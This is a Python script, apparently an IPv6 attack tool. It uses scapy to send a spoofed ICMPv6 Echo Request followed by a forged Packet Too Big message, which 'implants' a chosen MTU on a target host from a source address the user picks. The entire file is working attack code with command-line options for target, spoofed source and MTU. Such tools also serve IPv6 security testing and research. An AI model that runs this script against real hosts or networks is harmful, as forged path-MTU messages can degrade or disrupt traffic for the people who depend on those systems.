#!/usr/bin/python
import argparse
import logging
import sys

import netifaces
import netifaces as ni
import psutil
from scapy.layers.inet6 import IPv6, ICMPv6EchoRequest, ICMPv6PacketTooBig, IPerror6, ICMPv6EchoReply, fragment6
from scapy.sendrecv import sendp, send
from scapy.volatile import RandShort, RandString
from validate_parameters import is_valid_ipv6
from validate_parameters import is_valid_mac
from validate_parameters import is_valid_port


def main():
    parser = argparse.ArgumentParser(description="|> Implanting a specified MTU to a target from a specified host.")
    parser.add_argument("interface", nargs="?", help="the network interface to use from the sender.")
    parser.add_argument("-tip", dest="target_ip", action="store",
                        help="the IPv6 address of the target, who has to change the MTU.")
    parser.add_argument("-sip", dest="source_ip", action="store", help="the IPv6 address of the host, who sends "
                                                                       "Packet Too Big to the target (set to your "
                                                                       "address when skipping).")
    parser.add_argument("-mtu", dest="mtu", action="store", type=int, default=1500, help="the MTU in bytes that you "
                                                                                         "want to assign to target ("
                                                                                         "1500 if skipping).")
    args = parser.parse_args()

    # Validate the input
    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    # Validate the network interface
    if not args.interface:
        print("---> Network interface is required!!!")
        parser.print_help()
        sys.exit(1)
    interface_list = netifaces.interfaces()
    while True:
        if args.interface in interface_list:
            break
        else:
            print("---> The given interface is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source IPv6 address
    if args.source_ip is None:
        args.source_ip = ni.ifaddresses(args.interface)[ni.AF_INET6][0]['addr']
        args.source_ip = args.source_ip.replace("%", '')
        args.source_ip = args.source_ip.replace(args.interface, '')
    if args.source_ip is not None:
        if not is_valid_ipv6(args.source_ip):
            print("---> The given source IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the target IPv6 address
    if args.target_ip is None:
        print("---> No target IPv6 address is inserted. Try again!!!")
        sys.exit(1)
    if args.target_ip is not None:
        if not is_valid_ipv6(args.target_ip):
            print("---> The given target IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the MTU
    if args.mtu is None:
        args.mtu = 1500
    if args.mtu is not None:
        if not is_valid_port(args.mtu):
            print("---> The given MTU is invalid. Try again!!!")
            sys.exit(1)

    # Generate packet
    stats = psutil.net_if_stats()
    mtu_mine = stats.get(args.interface).mtu
    id = RandShort()
    seq = RandShort()
    layer3 = IPv6(src=args.source_ip, dst=args.target_ip, hlim=255)
    # Generate ICMPv6 Echo Request, it is compulsory before sending Packet Too Big
    data_1 = 'A' * (args.mtu - 48)  # 40 bytes IPv6 Header + 8 bytes ICMPv6 Header
    icmpv6_1 = ICMPv6EchoRequest(data=data_1, id=id, seq=seq)
    packet1 = layer3 / icmpv6_1
    # Generate ICMPv6 Echo Reply with Packet Too Big to the target
    data_2 = 'A' * (args.mtu - 96)  # 40 bytes outdoor IPv6 Header + 40 bytes indoor IPv6 Header + ICMPv6 + MTU
    icmpv6_2 = ICMPv6PacketTooBig(mtu=args.mtu) / IPerror6(src=args.target_ip, dst=args.source_ip) / ICMPv6EchoReply(data=data_2, id=id,
                                                                                          seq=seq)
    packet2 = layer3 / icmpv6_2

    if len(data_1) > mtu_mine:
        send(fragment6(packet1, mtu_mine), verbose=False, iface=args.interface)
        send(fragment6(packet2, mtu_mine), verbose=False, iface=args.interface)
    else:
        send([packet1, packet2], verbose=False, iface=args.interface)
        # send([packet2], verbose=False, iface=args.interface)
    print("Implanting specified MTU to the target: ", args.target_ip)


if __name__ == "__main__":
    # Turning off logging
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    main()



